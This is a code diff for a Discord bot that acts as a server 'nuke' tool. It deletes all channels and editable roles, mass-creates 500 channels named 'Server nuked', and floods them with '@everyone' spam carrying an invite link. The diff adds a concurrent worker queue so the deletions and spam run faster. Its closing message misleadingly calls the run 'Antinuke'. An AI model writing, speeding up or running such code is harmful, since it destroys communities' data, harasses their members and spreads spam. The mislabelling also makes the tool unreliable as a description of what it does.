@@ -25,8 +25,8 @@ const sleep = ms => new Promise(r => setTimeout(r, ms));
 const CHANNEL_NAME = "Server nuked";
 const CREATE_COUNT = 500;
 const MSG_PER_CHANNEL = 5;
-const DELETE_DELAY = 50;
-const CREATE_BATCH = 10;
+const DELETE_DELAY = 60;
+const WORKERS = 4; // số worker song song mỗi shard
 /* ================== */
 
 /* ===== Slash Command ===== */
@@ -50,11 +50,43 @@ const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);
     console.error(e);
   }
 })();
-/* ========================= */
 
 client.once("ready", () => {
   console.log(`🤖 Online: ${client.user.tag} | Shard ${client.shard?.ids[0] ?? 0}`);
 });
+
+/* ===== WORKER QUEUE SYSTEM ===== */
+class Queue {
+  constructor(workers = 4) {
+    this.tasks = [];
+    this.running = 0;
+    this.workers = workers;
+  }
+
+  add(task) {
+    return new Promise((resolve, reject) => {
+      this.tasks.push({ task, resolve, reject });
+      this.run();
+    });
+  }
+
+  async run() {
+    while (this.running < this.workers && this.tasks.length) {
+      const { task, resolve, reject } = this.tasks.shift();
+      this.running++;
+      task()
+        .then(resolve)
+        .catch(reject)
+        .finally(() => {
+          this.running--;
+          this.run();
+        });
+    }
+  }
+}
+/* =============================== */
+
+const queue = new Queue(WORKERS);
 
 client.on("interactionCreate", async interaction => {
   if (!interaction.isChatInputCommand()) return;
@@ -72,10 +104,12 @@ client.on("interactionCreate", async interaction => {
   /* ===== XOÁ CHANNEL ===== */
   for (const ch of [...guild.channels.cache.values()]) {
     if (ch.id === controlChannel.id) continue;
-    try {
-      await ch.delete();
-      await sleep(DELETE_DELAY);
-    } catch {}
+    queue.add(async () => {
+      try {
+        await ch.delete();
+        await sleep(DELETE_DELAY);
+      } catch {}
+    });
   }
 
   /* ===== XOÁ ROLE ===== */
@@ -84,32 +118,30 @@ client.on("interactionCreate", async interaction => {
     .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);
 
   for (const role of roles) {
-    try {
-      await role.delete();
-      await sleep(DELETE_DELAY);
-    } catch {}
+    queue.add(async () => {
+      try {
+        await role.delete();
+        await sleep(DELETE_DELAY);
+      } catch {}
+    });
   }
 
   await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");
 
   /* ===== TẠO KÊNH + GỬI TIN ===== */
-  for (let i = 0; i < CREATE_COUNT; i += CREATE_BATCH) {
-    const batch = [];
-
-    for (let j = 0; j < CREATE_BATCH && i + j < CREATE_COUNT; j++) {
-      batch.push(
-        guild.channels.create({
+  for (let i = 0; i < CREATE_COUNT; i++) {
+    queue.add(async () => {
+      try {
+        const ch = await guild.channels.create({
           name: CHANNEL_NAME,
           type: ChannelType.GuildText
-        }).then(async ch => {
-          for (let k = 0; k < MSG_PER_CHANNEL; k++) {
-            await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
-          }
-        })
-      );
-    }
+        });
 
-    await Promise.all(batch);
+        for (let k = 0; k < MSG_PER_CHANNEL; k++) {
+          await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
+        }
+      } catch {}
+    });
   }
 
   await controlChannel.send("✅ Hoàn tất Antinuke.");
